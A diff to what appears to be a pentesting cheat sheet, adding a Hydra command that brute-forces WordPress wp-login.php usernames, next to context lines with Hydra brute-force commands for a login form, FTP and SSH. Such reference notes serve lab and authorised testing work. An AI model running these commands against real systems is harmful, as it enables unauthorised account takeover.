@@ -584,6 +584,10 @@ hydra -l user -P pin_codes.txt http-post-form "/login.php:user=^USER^&pin=^PASS^
 ```sh
 hydra -t 4 -l <username> -P <Password txt file location> ftp://<target_ip>
 ```
+**Hydra For wp-login.php**
+```sh
+hydra -L <file for brute force> -p <any string> <ip-address> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+```
 ## Brute Forcing
 **Crafting Wordlist**
 - [RawSec](https://inventory.raw.pm/overview.html)
@@ -597,6 +601,7 @@ wordlistctl search rockyou
 ```sh
 hydra -l <ssh name> -P <passwordlist> -t 6 ssh://target
 ```
+
 - **For ports we can use `-p <portnumber>`**
 
 
